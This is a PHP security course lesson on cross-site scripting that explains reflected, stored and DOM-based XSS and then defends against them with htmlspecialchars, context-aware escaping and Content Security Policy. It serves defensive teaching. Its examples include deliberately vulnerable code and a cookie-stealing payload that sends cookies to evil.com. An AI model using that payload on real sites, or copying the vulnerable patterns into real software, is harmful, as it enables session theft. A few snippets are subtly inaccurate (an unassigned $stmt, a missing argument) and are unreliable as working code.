---
source_course: "php-security"
source_lesson: "php-security-xss-attacks"
---

# Cross-Site Scripting (XSS)

## Introduction
XSS allows attackers to inject malicious scripts into web pages viewed by other users.

## Key Concepts
- **Output Encoding**: Converting special characters to HTML entities with `htmlspecialchars()` using `ENT_QUOTES | ENT_SUBSTITUTE`.
- **Context-Aware Escaping**: Different contexts (HTML, JavaScript, CSS, URL) require different escaping strategies.
- **Stored vs Reflected XSS**: Stored XSS persists in the database; reflected XSS comes from the current request.
- **DOM-Based XSS**: XSS that occurs entirely in the browser through client-side JavaScript manipulation.

## Real World Context
XSS is consistently in the OWASP Top 10 and has affected sites like eBay, MySpace (Samy worm), and Twitter (TweetDeck vulnerability). A single unescaped output can allow attackers to steal session cookies, redirect users to phishing pages, or perform actions on behalf of logged-in users.

## Deep Dive
### Intro

XSS allows attackers to inject malicious scripts into web pages viewed by other users.

### Types of xss

### 1. Reflected XSS

Malicious script comes from the current request:

```php
<?php
// VULNERABLE
$search = $_GET['q'];
echo "You searched for: $search";

// Attack URL: search.php?q=<script>document.location='http://evil.com/steal?c='+document.cookie</script>
// Victim clicks link, their cookies are stolen
```

### 2. Stored XSS

Malicious script is stored in the database:

```php
<?php
// Comment form saves to database
$comment = $_POST['comment'];  // Contains <script>...</script>
$pdo->prepare('INSERT INTO comments (text) VALUES (:text)');
$stmt->execute(['text' => $comment]);

// Later, displayed to other users
foreach ($comments as $comment) {
    echo "<p>$comment</p>";  // Script executes!
}
```

### 3. DOM-Based XSS

Script manipulates the DOM directly:

```javascript
// JavaScript reads from URL and inserts into page
document.getElementById('name').innerHTML = location.hash.slice(1);
// Attack: page.html#<img src=x onerror=alert('XSS')>
```

### The solution: output encoding

```php
<?php
// ALWAYS encode output
$userInput = '<script>alert("XSS")</script>';

// HTML context
echo htmlspecialchars($userInput, ENT_QUOTES, 'UTF-8');
// Output: &lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;

// Safe - browsers display as text, don't execute
```

### Context-aware encoding

```php
<?php
// HTML content
echo '<p>' . htmlspecialchars($text, ENT_QUOTES, 'UTF-8') . '</p>';

// HTML attribute
echo '<input value="' . htmlspecialchars($value, ENT_QUOTES, 'UTF-8') . '">';

// URL parameter
echo '<a href="search.php?q=' . urlencode($query) . '">Search</a>';

// JavaScript string (be careful!)
echo '<script>var name = ' . json_encode($name) . ';</script>';

// CSS (avoid if possible)
// Never put user input in CSS without strict validation
```

### Content security policy (csp)

```php
<?php
// Prevent inline scripts entirely
header("Content-Security-Policy: script-src 'self'");

// With nonce for specific inline scripts
$nonce = base64_encode(random_bytes(16));
header("Content-Security-Policy: script-src 'nonce-$nonce'");

// In HTML:
echo "<script nonce=\"$nonce\">/* allowed */</script>";
```

## Common Pitfalls
1. **Escaping only in templates** — XSS can occur in JSON API responses, email bodies, PDF generation, and any output channel. Escape everywhere output is rendered.
2. **Using `strip_tags()` for XSS prevention** — `strip_tags()` is unreliable for security. Use `htmlspecialchars()` with proper flags instead.

## Best Practices
1. **Use `htmlspecialchars()` with `ENT_QUOTES | ENT_SUBSTITUTE` and UTF-8** — This handles the most common XSS vectors in HTML context.
2. **Implement Content Security Policy** — CSP headers provide a second layer of defense even if an XSS vulnerability exists in your code.

## Summary
- Prevent XSS by encoding all output with `htmlspecialchars(ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8')`.
- Use context-aware escaping — HTML, JavaScript, CSS, and URL contexts each need different encoding.
- CSP headers provide defense-in-depth against XSS even when encoding is missed.

## Resources

- [XSS Prevention](https://www.php.net/manual/en/function.htmlspecialchars.php) — htmlspecialchars function documentation

---

> 📘 *This lesson is part of the [PHP Security Engineering](https://stanza.dev/courses/php-security) course on [Stanza](https://stanza.dev) — the IDE-native learning platform for developers.*